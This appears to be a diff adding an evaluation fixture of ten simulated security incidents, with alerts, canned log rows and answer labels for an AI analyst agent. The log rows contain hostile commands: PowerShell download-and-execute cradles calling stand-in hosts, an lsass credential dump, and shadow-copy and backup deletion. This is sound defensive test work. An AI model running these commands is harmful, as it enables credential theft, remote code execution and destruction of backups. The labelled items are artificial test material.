@@ -1,0 +1,264 @@
+# Attacks the estate answers clearly. A run that looks finds the evidence; the
+# question is whether it looks, and whether it says so.
+
+- id: atk-01-encoded-powershell-c2
+  truth: attack
+  traps: []
+  rationale: Word spawns encoded PowerShell that downloads a stager and beacons to a known C2 address on a fixed interval.
+  alert: |
+    EDR finding f-1001 on host ws-0142 (user user0007): winword.exe spawned powershell.exe with an encoded command line. Case c-1001.
+  tools:
+    get_finding:
+      - rows:
+          - { finding_id: f-1001, host: ws-0142, user: user0007, detection: "Office application spawned PowerShell with -EncodedCommand", severity: high, parent: winword.exe, child: powershell.exe, command_line: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...", time: "2026-09-14T09:12:03Z" }
+    case_records:
+      - rows:
+          - { case_id: c-1001, opened: "2026-09-14T09:13:00Z", note: "user0007 is in Finance; reported an invoice email from an unknown sender this morning" }
+    splunk_search:
+      - match: [ws-0142, powershell]
+        rows:
+          - { time: "2026-09-14T09:12:03Z", host: ws-0142, user: user0007, source: sysmon, event: process_create, detail: "powershell.exe -enc ... decoded: IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a')" }
+          - { time: "2026-09-14T09:12:05Z", host: ws-0142, user: user0007, source: sysmon, event: file_create, detail: "C:\\Users\\user0007\\AppData\\Roaming\\svchelper.exe" }
+      - match: [ws-0142]
+        rows:
+          - { time: "2026-09-14T09:12:04Z", host: ws-0142, source: proxy, event: http_get, detail: "GET http://198.51.100.23/a 200 48213 bytes" }
+          - { time: "2026-09-14T09:17:04Z", host: ws-0142, source: firewall, event: conn, detail: "ws-0142 -> 198.51.100.23:443 every 300s since 09:12, 41 connections" }
+      - match: ["198.51.100.23"]
+        rows:
+          - { time: "2026-09-14T09:12:04Z", host: ws-0142, source: proxy, event: http_get, detail: "GET http://198.51.100.23/a 200" }
+          - { time: "2026-09-14T09:17:04Z", host: ws-0142, source: firewall, event: conn, detail: "periodic 300s beacon, 41 connections, only host in the estate contacting this address" }
+    lookup_indicators:
+      - match: ["198.51.100.23"]
+        rows:
+          - { indicator: "198.51.100.23", type: ip, verdict: malicious, feed: commercial-c2-feed, tags: [cobalt-strike, c2], first_seen: "2026-08-30" }
+    search_findings:
+      - match: [ws-0142]
+        rows:
+          - { finding_id: f-1002, host: ws-0142, detection: "Unsigned binary written to AppData and executed", severity: medium }
+
+- id: atk-02-password-spray-success
+  truth: attack
+  traps: []
+  rationale: One external address fails logins for 60 accounts then succeeds on one, which then registers a new MFA device.
+  alert: |
+    Identity finding f-1101: 214 failed sign-ins across 61 accounts from 203.0.113.45 within 20 minutes. Case c-1101.
+  tools:
+    get_finding:
+      - rows:
+          - { finding_id: f-1101, detection: "Many accounts, one source: possible password spray", source_ip: "203.0.113.45", failed: 214, accounts: 61, window: "2026-09-15T02:00Z/02:20Z" }
+    splunk_search:
+      - match: ["203.0.113.45", success]
+        rows:
+          - { time: "2026-09-15T02:19:41Z", user: user0031, source: idp, event: sign_in_success, detail: "from 203.0.113.45, legacy auth protocol, no MFA challenge" }
+      - match: ["203.0.113.45"]
+        rows:
+          - { time: "2026-09-15T02:00:02Z", source: idp, event: sign_in_failure, detail: "213 failures across 60 accounts, password incorrect" }
+          - { time: "2026-09-15T02:19:41Z", user: user0031, source: idp, event: sign_in_success, detail: "legacy auth, no MFA challenge" }
+      - match: [user0031]
+        rows:
+          - { time: "2026-09-15T02:19:41Z", user: user0031, source: idp, event: sign_in_success, detail: "from 203.0.113.45" }
+          - { time: "2026-09-15T02:24:10Z", user: user0031, source: idp, event: mfa_method_added, detail: "new authenticator app registered" }
+          - { time: "2026-09-15T02:31:55Z", user: user0031, source: mail, event: inbox_rule_created, detail: "forward messages containing 'invoice' to an external address" }
+    lookup_indicators:
+      - match: ["203.0.113.45"]
+        rows:
+          - { indicator: "203.0.113.45", type: ip, verdict: suspicious, tags: [vpn-exit, spray-source], reports: 37 }
+    case_records:
+      - rows:
+          - { case_id: c-1101, note: "user0031 is on leave this week" }
+
+- id: atk-03-lsass-dump
+  truth: attack
+  traps: []
+  rationale: A renamed procdump writes an lsass memory dump that is then compressed and moved to a share.
+  alert: |
+    EDR finding f-1201 on server srv-app-03: process accessed lsass.exe memory with PROCESS_VM_READ. Case c-1201.
+  tools:
+    get_finding:
+      - rows:
+          - { finding_id: f-1201, host: srv-app-03, user: svc-deploy, detection: "Credential access: handle to lsass.exe with read access", process: "C:\\ProgramData\\upd.exe", severity: high }
+    splunk_search:
+      - match: [upd.exe]
+        rows:
+          - { time: "2026-09-16T23:41:10Z", host: srv-app-03, user: svc-deploy, source: sysmon, event: process_create, detail: "upd.exe -accepteula -ma lsass.exe C:\\ProgramData\\l.dmp ; original file name procdump64.exe" }
+      - match: [srv-app-03]
+        rows:
+          - { time: "2026-09-16T23:41:10Z", host: srv-app-03, source: sysmon, event: process_create, detail: "upd.exe (procdump64.exe renamed) -ma lsass.exe" }
+          - { time: "2026-09-16T23:42:02Z", host: srv-app-03, source: sysmon, event: process_create, detail: "7z.exe a -p C:\\ProgramData\\l.7z C:\\ProgramData\\l.dmp" }
+          - { time: "2026-09-16T23:43:30Z", host: srv-app-03, source: smb, event: file_write, detail: "\\\\fs-02\\public\\tmp\\l.7z" }
+      - match: [svc-deploy]
+        rows:
+          - { time: "2026-09-16T23:39:58Z", user: svc-deploy, host: srv-app-03, source: windows, event: logon, detail: "type 10 (RDP) from 192.0.2.77, first RDP logon for this account in 90 days" }
+    case_records:
+      - rows:
+          - { case_id: c-1201, note: "svc-deploy runs the nightly deployment job; it does not log on interactively" }
+
+- id: atk-04-cloud-key-exfil
+  truth: attack
+  traps: []
+  rationale: An access key unused for months is used from a new country to enumerate and copy an S3 bucket out.
+  alert: |
+    Cloud finding f-1301: access key AKIA000000000001 used from a new ASN after 140 days dormant. Case c-1301.
+  tools:
+    get_finding:
+      - rows:
+          - { finding_id: f-1301, principal: "arn:aws:iam::000000000001:user/user0042", key: AKIA000000000001, detection: "Dormant access key used from new network", source_ip: "198.51.100.140" }
+    splunk_search:
+      - match: [AKIA000000000001]
+        rows:
+          - { time: "2026-09-17T04:02:11Z", source: cloudtrail, event: ListBuckets, detail: "from 198.51.100.140" }
+          - { time: "2026-09-17T04:03:40Z", source: cloudtrail, event: GetObject, detail: "bucket hr-records-prod, 4,812 objects in 9 minutes" }
+          - { time: "2026-09-17T04:14:02Z", source: cloudtrail, event: PutBucketPolicy, detail: "hr-records-prod policy grants s3:GetObject to an external account" }
+      - match: [user0042]
+        rows:
+          - { time: "2026-04-30T17:00:00Z", source: hr, event: offboarded, detail: "user0042 left the company; console access removed, access key not rotated" }
+      - match: ["198.51.100.140"]
+        rows:
+          - { time: "2026-09-17T04:02:11Z", source: cloudtrail, event: ListBuckets, detail: "first appearance of this address in 180 days of logs" }
+    lookup_indicators:
+      - match: ["198.51.100.140"]
+        rows:
+          - { indicator: "198.51.100.140", type: ip, verdict: unknown, tags: [hosting-provider] }
+
+- id: atk-05-webshell
+  truth: attack
+  traps: []
+  rationale: A new .aspx file in the web root receives POSTs and its worker process spawns cmd and whoami.
+  alert: |
+    Finding f-1401: IIS worker process w3wp.exe on web-01 spawned cmd.exe. Case c-1401.
+  tools:
+    get_finding:
+      - rows:
+          - { finding_id: f-1401, host: web-01, detection: "Web server process spawned a shell", parent: w3wp.exe, child: cmd.exe, command_line: "cmd.exe /c whoami & ipconfig /all" }
+    splunk_search:
+      - match: [web-01, aspx]
+        rows:
+          - { time: "2026-09-18T11:02:00Z", host: web-01, source: sysmon, event: file_create, detail: "C:\\inetpub\\wwwroot\\uploads\\thumb.aspx (created by w3wp.exe)" }
+      - match: [web-01]
+        rows:
+          - { time: "2026-09-18T11:02:00Z", host: web-01, source: sysmon, event: file_create, detail: "C:\\inetpub\\wwwroot\\uploads\\thumb.aspx" }
+          - { time: "2026-09-18T11:05:12Z", host: web-01, source: iis, event: request, detail: "POST /uploads/thumb.aspx 200 from 203.0.113.9, 14 requests" }
+          - { time: "2026-09-18T11:05:13Z", host: web-01, source: sysmon, event: process_create, detail: "w3wp.exe -> cmd.exe /c whoami & ipconfig /all" }
+      - match: ["203.0.113.9"]
+        rows:
+          - { time: "2026-09-18T11:01:40Z", host: web-01, source: iis, event: request, detail: "POST /upload.ashx 200 multipart, filename thumb.aspx" }
+    lookup_indicators:
+      - match: ["203.0.113.9"]
+        rows:
+          - { indicator: "203.0.113.9", type: ip, verdict: malicious, tags: [web-exploitation, scanner] }
+
+- id: atk-06-lateral-psexec
+  truth: attack
+  traps: []
+  rationale: A helpdesk account authenticates to twelve servers in four minutes and installs a PsExec-style service on each.
+  alert: |
+    Finding f-1501: account user0019 created services on 12 hosts in 4 minutes. Case c-1501.
+  tools:
+    get_finding:
+      - rows:
+          - { finding_id: f-1501, user: user0019, detection: "Remote service creation across many hosts", hosts: 12, service_name: "PSEXESVC-like random name" }
+    splunk_search:
+      - match: [user0019]
+        rows:
+          - { time: "2026-09-19T03:10:00Z", user: user0019, source: windows, event: service_install, detail: "service 'kxwqzt' on srv-db-01 running C:\\Windows\\kxwqzt.exe" }
+          - { time: "2026-09-19T03:10:20Z", user: user0019, source: windows, event: logon, detail: "type 3 to 12 servers from ws-0311 in 4 minutes" }
+          - { time: "2026-09-19T03:14:02Z", user: user0019, source: windows, event: process_create, detail: "kxwqzt.exe -> rundll32.exe C:\\Windows\\Temp\\d.dll,Start on srv-db-01" }
+      - match: [ws-0311]
+        rows:
+          - { time: "2026-09-19T02:50:00Z", host: ws-0311, source: edr, event: alert, detail: "browser download of 'invoice_viewer.exe', executed by user0019" }
+    case_records:
+      - rows:
+          - { case_id: c-1501, note: "user0019 is a helpdesk technician on the day shift (08:00-17:00)" }
+
+- id: atk-07-dns-tunnel
+  truth: attack
+  traps: []
+  rationale: A workstation sends thousands of long, high-entropy subdomain queries to one newly registered domain.
+  alert: |
+    Finding f-1601: high volume of long DNS queries from ws-0277 to one domain. Case c-1601.
+  tools:
+    get_finding:
+      - rows:
+          - { finding_id: f-1601, host: ws-0277, detection: "Possible DNS tunnelling", domain: "cdn-sync.example.net", queries: 18422 }
+    splunk_search:
+      - match: [ws-0277]
+        rows:
+          - { time: "2026-09-20T13:00:00Z", host: ws-0277, source: dns, event: query, detail: "18,422 TXT queries to *.cdn-sync.example.net in 2h, mean label length 58, entropy 4.9 bits/char" }
+          - { time: "2026-09-20T12:58:10Z", host: ws-0277, source: sysmon, event: process_create, detail: "rundll32.exe C:\\Users\\Public\\upd.dll,Run (unsigned)" }
+      - match: [cdn-sync]
+        rows:
+          - { time: "2026-09-20T13:00:00Z", source: dns, event: query, detail: "ws-0277 is the only host in the estate querying this domain" }
+    lookup_indicators:
+      - match: [cdn-sync]
+        rows:
+          - { indicator: "cdn-sync.example.net", type: domain, verdict: suspicious, registered: "2026-09-18", tags: [newly-registered] }
+
+- id: atk-08-ransomware-precursor
+  truth: attack
+  traps: []
+  rationale: Volume shadow copies are deleted and backups disabled across a file server by a newly created admin account.
+  alert: |
+    Finding f-1701 on fs-02: vssadmin delete shadows /all /quiet executed. Case c-1701.
+  tools:
+    get_finding:
+      - rows:
+          - { finding_id: f-1701, host: fs-02, user: adm-temp01, detection: "Shadow copy deletion", command_line: "vssadmin.exe delete shadows /all /quiet" }
+    splunk_search:
+      - match: [adm-temp01]
+        rows:
+          - { time: "2026-09-21T01:12:00Z", source: ad, event: user_created, detail: "adm-temp01 created and added to Domain Admins by user0019" }
+          - { time: "2026-09-21T01:40:00Z", host: fs-02, user: adm-temp01, source: windows, event: process_create, detail: "vssadmin delete shadows /all /quiet; wbadmin delete catalog -quiet; bcdedit /set {default} recoveryenabled no" }
+      - match: [fs-02]
+        rows:
+          - { time: "2026-09-21T01:40:00Z", host: fs-02, source: windows, event: process_create, detail: "vssadmin delete shadows /all /quiet" }
+          - { time: "2026-09-21T01:41:30Z", host: fs-02, source: windows, event: service_stop, detail: "backup agent service stopped by adm-temp01" }
+    case_records:
+      - rows:
+          - { case_id: c-1701, note: "No change ticket covers fs-02 this week" }
+
+- id: atk-09-oauth-consent-phish
+  truth: attack
+  traps: []
+  rationale: A user grants an unverified OAuth app mail and file scopes; the app immediately reads mail in bulk from a foreign host.
+  alert: |
+    Finding f-1801: user0055 consented to app 'Doc Viewer Pro' requesting Mail.Read and Files.Read.All. Case c-1801.
+  tools:
+    get_finding:
+      - rows:
+          - { finding_id: f-1801, user: user0055, detection: "OAuth consent to unverified multi-tenant app", app: "Doc Viewer Pro", scopes: [Mail.Read, Files.Read.All, offline_access] }
+    splunk_search:
+      - match: [doc viewer]
+        rows:
+          - { time: "2026-09-22T10:01:00Z", source: idp, event: consent_granted, detail: "publisher unverified, app created 2 days ago" }
+          - { time: "2026-09-22T10:03:00Z", source: graph, event: mail_read, detail: "2,940 messages read via the app from 203.0.113.200 in 6 minutes" }
+      - match: [user0055]
+        rows:
+          - { time: "2026-09-22T09:58:30Z", user: user0055, source: mail, event: url_click, detail: "clicked link in 'Shared document: Q3 bonuses' from an external sender" }
+          - { time: "2026-09-22T10:01:00Z", user: user0055, source: idp, event: consent_granted, detail: "Doc Viewer Pro" }
+    lookup_indicators:
+      - match: ["203.0.113.200"]
+        rows:
+          - { indicator: "203.0.113.200", type: ip, verdict: malicious, tags: [oauth-phishing-infrastructure] }
+
+- id: atk-10-persistence-scheduled-task
+  truth: attack
+  traps: []
+  rationale: A scheduled task runs a script from a temp path every hour that pulls a payload from a paste site.
+  alert: |
+    Finding f-1901 on ws-0090: new scheduled task 'OneDriveUpdateCheck' runs a script from %TEMP%. Case c-1901.
+  tools:
+    get_finding:
+      - rows:
+          - { finding_id: f-1901, host: ws-0090, detection: "Scheduled task executing from a user temp directory", task: OneDriveUpdateCheck, action: "wscript.exe C:\\Users\\user0063\\AppData\\Local\\Temp\\u.vbs" }
+    splunk_search:
+      - match: [u.vbs]
+        rows:
+          - { time: "2026-09-23T15:00:01Z", host: ws-0090, source: sysmon, event: process_create, detail: "wscript.exe u.vbs -> powershell.exe iwr https://paste.example.org/raw/zz81 | iex" }
+      - match: [ws-0090]
+        rows:
+          - { time: "2026-09-23T14:20:00Z", host: ws-0090, source: sysmon, event: task_created, detail: "OneDriveUpdateCheck, hourly, created by excel.exe child process" }
+          - { time: "2026-09-23T15:00:01Z", host: ws-0090, source: sysmon, event: process_create, detail: "wscript.exe u.vbs -> powershell download from paste.example.org" }
+    search_findings:
+      - match: [ws-0090]
+        rows:
+          - { finding_id: f-1902, host: ws-0090, detection: "Excel macro wrote a .vbs file to Temp", severity: medium }
